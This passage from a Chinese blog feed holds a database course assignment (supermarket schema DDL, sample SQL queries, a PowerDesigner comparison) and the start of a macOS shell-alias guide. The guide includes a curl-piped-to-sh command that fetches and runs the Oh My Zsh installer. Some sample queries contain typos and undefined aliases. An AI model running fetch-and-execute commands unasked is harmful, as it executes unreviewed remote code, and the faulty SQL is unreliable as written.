     <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   buy_time             <span class="hljs-type">timestamp</span>                      <span class="hljs-keyword">null</span>,   buy_costs            <span class="hljs-type">integer</span>                        <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_BUY <span class="hljs-keyword">primary</span> key clustered (cu_id, goods_id));<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> buy   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_BUY_BUY_CUSTOMER <span class="hljs-keyword">foreign</span> key (cu_id)      <span class="hljs-keyword">references</span> customer (cu_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> sell (   emp_no               <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_SELL <span class="hljs-keyword">primary</span> key clustered (emp_no, goods_id));<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> sell   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_SELL_SELL_EMPLOYEE <span class="hljs-keyword">foreign</span> key (emp_no)      <span class="hljs-keyword">references</span> employee (emp_no)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> sell   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_SELL_SELL2_GOODS <span class="hljs-keyword">foreign</span> key (goods_id)      <span class="hljs-keyword">references</span> goods (goods_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;</code></pre></div></div><h4 id="查询语句样例">2.4 查询语句样例</h4><p>1.单表查询</p><p>查询单价为10元的商品名称</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-ftnruolluwpkzv"></i><span>sql</span><div class="collapse show" id="collapse-ftnruolluwpkzv"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> goods_name <span class="hljs-keyword">from</span> goods<span class="hljs-keyword">where</span> price<span class="hljs-operator">=</span><span class="hljs-number">10</span></code></pre></div></div><p>2.多表连接查询</p><p>查询每个厂商生产商品的平均价格</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-jqkmbmlluwpkzv"></i><span>SQL</span><div class="collapse show" id="collapse-jqkmbmlluwpkzv"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> sp_id,<span class="hljs-built_in">avg</span>(price)<span class="hljs-keyword">from</span> supply <span class="hljs-keyword">natural</span> <span class="hljs-keyword">join</span> goods<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> sp_id</code></pre></div></div><p>3.4多表嵌套查询和exist查询</p><p>查询只有一种商品的货架，返回这种商品的名称和货架id</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-erhtbqlluwpkzv"></i><span>sql</span><div class="collapse show" id="collapse-erhtbqlluwpkzv"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> goods_name,shelf_id<span class="hljs-keyword">from</span> goods,shelf<span class="hljs-keyword">where</span> goods.shelf_id<span class="hljs-operator">=</span>shelf.shelf_id <span class="hljs-keyword">and</span> goods.goods_num<span class="hljs-operator">=</span>shelf.goods_num_on_shelf</code></pre></div></div><p>也可以只在goods表中查</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-4pbsgrlluwpkzv"></i><span>sql</span><div class="collapse show" id="collapse-4pbsgrlluwpkzv"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> goods_name<span class="hljs-keyword">from</span> goods g1<span class="hljs-keyword">where</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">exists</span> (<span class="hljs-keyword">select</span><span class="hljs-operator">*</span><span class="hljs-keyword">from</span> goods<span class="hljs-keyword">where</span> shelf.id<span class="hljs-operator">=</span>e1.shelf.id <span class="hljs-keyword">and</span>goods_name<span class="hljs-operator">&lt;&gt;</span>e1.goods_name);</code></pre></div></div><p>5.聚合查询</p><p>有10种以上商品的货架，以及拥有的商品种类数</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-hz4cr9lluwpkzv"></i><span>sql</span><div class="collapse show" id="collapse-hz4cr9lluwpkzv"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> shelf_id,<span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)<span class="hljs-keyword">from</span> goods<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> shef_id<span class="hljs-keyword">having</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>)<span class="hljs-operator">&gt;</span><span class="hljs-number">10</span>;</code></pre></div></div><h4 id="powerdesigner-绘制er图">3.1 PowerDesigner 绘制ER图</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%B7%A5%E7%A8%8B%E4%BD%9C%E4%B8%9A%E8%AE%BE%E8%AE%A1/20230828211230228848_283_20220919004326633367_468_image-20220415222750452.png" alt="image-20220415222750452"><figcaption aria-hidden="true">image-20220415222750452</figcaption></figure><h4 id="转为关系模型">3.2 转为关系模型</h4><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E6%9C%9F%E6%9C%AB%E5%B7%A5%E7%A8%8B%E4%BD%9C%E4%B8%9A%E8%AE%BE%E8%AE%A1/20230828211231407880_506_20220919004327928426_899_image-20220415222820109.png" alt="image-20220415222820109"><figcaption aria-hidden="true">image-20220415222820109</figcaption></figure><h4 id="生成sql语句">3.3 生成SQL语句</h4><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zoakeylluwpkzv"></i><span>sql</span><div class="collapse show" id="collapse-zoakeylluwpkzv"><pre><code class="hljs sql"><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* DBMS name:      Sybase SQL Anywhere 12                       */</span><span class="hljs-comment">/* Created on:     2022/4/15 22:28:49                           */</span><span class="hljs-comment">/*==============================================================*/</span>if <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> sys.sysforeignkey <span class="hljs-keyword">where</span> role<span class="hljs-operator">=</span><span class="hljs-string">'FK_BUY_BUY_CUSTOMER'</span>) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> buy       <span class="hljs-keyword">delete</span> <span class="hljs-keyword">foreign</span> key FK_BUY_BUY_CUSTOMER<span class="hljs-keyword">end</span> if;if <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> sys.sysforeignkey <span class="hljs-keyword">where</span> role<span class="hljs-operator">=</span><span class="hljs-string">'FK_BUY_BUY2_GOODS'</span>) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> buy       <span class="hljs-keyword">delete</span> <span class="hljs-keyword">foreign</span> key FK_BUY_BUY2_GOODS<span class="hljs-keyword">end</span> if;if <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> sys.sysforeignkey <span class="hljs-keyword">where</span> role<span class="hljs-operator">=</span><span class="hljs-string">'FK_GOODS_ON_SHELF'</span>) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> goods       <span class="hljs-keyword">delete</span> <span class="hljs-keyword">foreign</span> key FK_GOODS_ON_SHELF<span class="hljs-keyword">end</span> if;if <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> sys.sysforeignkey <span class="hljs-keyword">where</span> role<span class="hljs-operator">=</span><span class="hljs-string">'FK_SELL_SELL_EMPLOYEE'</span>) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> sell       <span class="hljs-keyword">delete</span> <span class="hljs-keyword">foreign</span> key FK_SELL_SELL_EMPLOYEE<span class="hljs-keyword">end</span> if;if <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> sys.sysforeignkey <span class="hljs-keyword">where</span> role<span class="hljs-operator">=</span><span class="hljs-string">'FK_SELL_SELL2_GOODS'</span>) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> sell       <span class="hljs-keyword">delete</span> <span class="hljs-keyword">foreign</span> key FK_SELL_SELL2_GOODS<span class="hljs-keyword">end</span> if;if <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> sys.sysforeignkey <span class="hljs-keyword">where</span> role<span class="hljs-operator">=</span><span class="hljs-string">'FK_SUPPLY_SUPPLY_GOODS'</span>) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> supply       <span class="hljs-keyword">delete</span> <span class="hljs-keyword">foreign</span> key FK_SUPPLY_SUPPLY_GOODS<span class="hljs-keyword">end</span> if;if <span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> sys.sysforeignkey <span class="hljs-keyword">where</span> role<span class="hljs-operator">=</span><span class="hljs-string">'FK_SUPPLY_SUPPLY2_SUPPLIER'</span>) <span class="hljs-keyword">then</span>    <span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> supply       <span class="hljs-keyword">delete</span> <span class="hljs-keyword">foreign</span> key FK_SUPPLY_SUPPLY2_SUPPLIER<span class="hljs-keyword">end</span> if;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> buy.buy2_FK;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> buy.buy_FK;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> buy.buy_PK;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> buy;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> customer.customer_PK;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> customer;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> employee.emplyer_PK;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> employee;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> goods.on_FK;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> goods.goods_PK;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> goods;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> sell.sell2_FK;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> sell.sell_FK;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> sell.sell_PK;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> sell;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> shelf.shelf_PK;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> shelf;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> supplier.supplier_PK;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> supplier;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> supply.supply2_FK;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> supply.supply_FK;<span class="hljs-keyword">drop</span> index if <span class="hljs-keyword">exists</span> supply.supply_PK;<span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> if <span class="hljs-keyword">exists</span> supply;<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Table: buy                                                   */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> buy (   cu_id                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   buy_time             <span class="hljs-type">timestamp</span>                      <span class="hljs-keyword">null</span>,   buy_costs            <span class="hljs-type">integer</span>                        <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_BUY <span class="hljs-keyword">primary</span> key clustered (cu_id, goods_id));<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: buy_PK                                                */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">unique</span> clustered index buy_PK <span class="hljs-keyword">on</span> buy (cu_id <span class="hljs-keyword">ASC</span>,goods_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: buy_FK                                                */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> index buy_FK <span class="hljs-keyword">on</span> buy (cu_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: buy2_FK                                               */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> index buy2_FK <span class="hljs-keyword">on</span> buy (goods_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Table: customer                                              */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> customer (   cu_id                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   cu_name              <span class="hljs-type">varchar</span>(<span class="hljs-number">4</span>)                     <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_CUSTOMER <span class="hljs-keyword">primary</span> key (cu_id));<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: customer_PK                                           */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">unique</span> index customer_PK <span class="hljs-keyword">on</span> customer (cu_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Table: employee                                              */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> employee (   emp_name             <span class="hljs-type">varchar</span>(<span class="hljs-number">4</span>)                     <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   emp_no               <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   salary               <span class="hljs-type">integer</span>                        <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_EMPLOYEE <span class="hljs-keyword">primary</span> key (emp_no));<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: emplyer_PK                                            */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">unique</span> index emplyer_PK <span class="hljs-keyword">on</span> employee (emp_no <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Table: goods                                                 */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> goods (   goods_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   shelf_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_name           <span class="hljs-type">varchar</span>(<span class="hljs-number">10</span>)                    <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   price                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_num            <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   shell_life           <span class="hljs-type">timestamp</span>                      <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_GOODS <span class="hljs-keyword">primary</span> key (goods_id));<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: goods_PK                                              */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">unique</span> index goods_PK <span class="hljs-keyword">on</span> goods (goods_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: on_FK                                                 */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> index on_FK <span class="hljs-keyword">on</span> goods (shelf_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Table: sell                                                  */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> sell (   emp_no               <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_SELL <span class="hljs-keyword">primary</span> key clustered (emp_no, goods_id));<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: sell_PK                                               */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">unique</span> clustered index sell_PK <span class="hljs-keyword">on</span> sell (emp_no <span class="hljs-keyword">ASC</span>,goods_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: sell_FK                                               */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> index sell_FK <span class="hljs-keyword">on</span> sell (emp_no <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: sell2_FK                                              */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> index sell2_FK <span class="hljs-keyword">on</span> sell (goods_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Table: shelf                                                 */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> shelf (   shelf_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   goods_num_on_shelf   <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_SHELF <span class="hljs-keyword">primary</span> key (shelf_id));<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: shelf_PK                                              */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">unique</span> index shelf_PK <span class="hljs-keyword">on</span> shelf (shelf_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Table: supplier                                              */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> supplier (   sp_id                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   sp_name              <span class="hljs-type">varchar</span>(<span class="hljs-number">10</span>)                    <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   address              <span class="hljs-type">varchar</span>(<span class="hljs-number">10</span>)                    <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   phone                <span class="hljs-type">char</span>(<span class="hljs-number">11</span>)                       <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_SUPPLIER <span class="hljs-keyword">primary</span> key (sp_id));<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: supplier_PK                                           */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">unique</span> index supplier_PK <span class="hljs-keyword">on</span> supplier (sp_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Table: supply                                                */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> supply (   goods_id             <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   sp_id                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   enter_time           <span class="hljs-type">timestamp</span>                      <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   costs                <span class="hljs-type">integer</span>                        <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,   <span class="hljs-keyword">constraint</span> PK_SUPPLY <span class="hljs-keyword">primary</span> key clustered (goods_id, sp_id));<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: supply_PK                                             */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">unique</span> clustered index supply_PK <span class="hljs-keyword">on</span> supply (goods_id <span class="hljs-keyword">ASC</span>,sp_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: supply_FK                                             */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> index supply_FK <span class="hljs-keyword">on</span> supply (goods_id <span class="hljs-keyword">ASC</span>);<span class="hljs-comment">/*==============================================================*/</span><span class="hljs-comment">/* Index: supply2_FK                                            */</span><span class="hljs-comment">/*==============================================================*/</span><span class="hljs-keyword">create</span> index supply2_FK <span class="hljs-keyword">on</span> supply (sp_id <span class="hljs-keyword">ASC</span>);<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> buy   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_BUY_BUY_CUSTOMER <span class="hljs-keyword">foreign</span> key (cu_id)      <span class="hljs-keyword">references</span> customer (cu_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> buy   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_BUY_BUY2_GOODS <span class="hljs-keyword">foreign</span> key (goods_id)      <span class="hljs-keyword">references</span> goods (goods_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> goods   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_GOODS_ON_SHELF <span class="hljs-keyword">foreign</span> key (shelf_id)      <span class="hljs-keyword">references</span> shelf (shelf_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> sell   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_SELL_SELL_EMPLOYEE <span class="hljs-keyword">foreign</span> key (emp_no)      <span class="hljs-keyword">references</span> employee (emp_no)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> sell   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_SELL_SELL2_GOODS <span class="hljs-keyword">foreign</span> key (goods_id)      <span class="hljs-keyword">references</span> goods (goods_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> supply   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_SUPPLY_SUPPLY_GOODS <span class="hljs-keyword">foreign</span> key (goods_id)      <span class="hljs-keyword">references</span> goods (goods_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> supply   <span class="hljs-keyword">add</span> <span class="hljs-keyword">constraint</span> FK_SUPPLY_SUPPLY2_SUPPLIER <span class="hljs-keyword">foreign</span> key (sp_id)      <span class="hljs-keyword">references</span> supplier (sp_id)      <span class="hljs-keyword">on</span> <span class="hljs-keyword">update</span> restrict      <span class="hljs-keyword">on</span> <span class="hljs-keyword">delete</span> restrict;</code></pre></div></div><h4 id="分析差异">4.1 分析差异</h4><p>有差异。PowerDesigner会事先判断外键约束、索引以及表本身是否存在，若存在会删除。同时也会对表建立索引。但是基本逻辑是一致的，在总体的设计上不会造成影响。</p><h4 id="语句特点">4.2 语句特点</h4><p>从4.1的分析可以看出，PowerDesigner生成的语句更严谨。当然，语句顺序比如外键约束声明的位置也有不同。这些附加语句的作用是防止特殊情况的发生导致无法正常建立表。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据库</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>macOS配置命令别名</title>
    <link href="/posts/42356/"/>
    <url>/posts/42356/</url>
    
    <content type="html"><![CDATA[<h2 id="macos配置命令别名">macOS配置命令别名</h2><h3 id="临时别名">临时别名</h3><p>和在linux系统一样，直接输入<code>alias</code>命令即可。在当前的终端下生效。</p><p>比如：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-wwwr3qlluxp18y"></i><span>shell</span><div class="collapse show" id="collapse-wwwr3qlluxp18y"><pre><code class="hljs shell">alias v="vim"</code></pre></div></div><h3 id="永久别名">永久别名</h3><p><strong>写在前面：知其然也要知其所以然，下面的命令不要急着拷贝运行一把梭！</strong></p><p>由于现在的macOS默认是采用的<code>zsh</code>而不是<code>bash</code>，因此配置文件路径为</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-7wki9ylluxp18y"></i><span>shell</span><div class="collapse show" id="collapse-7wki9ylluxp18y"><pre><code class="hljs shell">sudo vim /etc/zshrc</code></pre></div></div><p>当然也可以</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-dp5a6plluxp18y"></i><span>shell</span><div class="collapse show" id="collapse-dp5a6plluxp18y"><pre><code class="hljs shell">chsh -s /bin/bash</code></pre></div></div><p>进入<code>bash</code>，不过目前没什么理由这么干(</p><p>然后会发现这个文件是只读的。</p><p>有两个解决方案。</p><h4 id="简单粗暴的">简单粗暴的</h4><p>去除写权限</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-6zprmelluxp18y"></i><span>shell</span><div class="collapse show" id="collapse-6zprmelluxp18y"><pre><code class="hljs shell">sudo chmod u+w /etc/bashrc</code></pre></div></div><p>然后写入别名，保存</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-vcm7uclluxp18y"></i><span>shell</span><div class="collapse show" id="collapse-vcm7uclluxp18y"><pre><code class="hljs shell">source /etc/bashrc</code></pre></div></div><p>最后将写权限去除</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-b9s3aglluxp18y"></i><span>shell</span><div class="collapse show" id="collapse-b9s3aglluxp18y"><pre><code class="hljs shell">sudo chmod u-w /etc/bashrc</code></pre></div></div><h4 id="安装插件">安装插件</h4><p><a href="https://github.com/ohmyzsh/ohmyzsh"><strong>Oh MyZsh</strong></a>是一款社区驱动的命令行工具，可以配置主题，插件等。</p><p>用curl方式安装</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-zna4wdlluxp18y"></i><span>shell</span><div class="collapse show" id="collapse-zna4wdlluxp18y"><pre><code class="hljs shell">sh -c "$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)"</code></pre></div></div><p>在<code>.zshrc</code>中配置<code>alias</code>，<code>source</code>保存即可，里面还可以配置其他实用的配置。<a href="https://mrseawave.github.io/blogs/articles/2021/08/29/oh-my-zsh/">这个博客</a>有较详细叙述。</p><p>所以，安装插件后可以(不安装插件也可以在用户根目录新建这个文件)</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-k2clb2lluxp18y"></i><span>shell</span><div class="collapse show" id="collapse-k2clb2lluxp18y"><pre><code class="hljs shell">vim 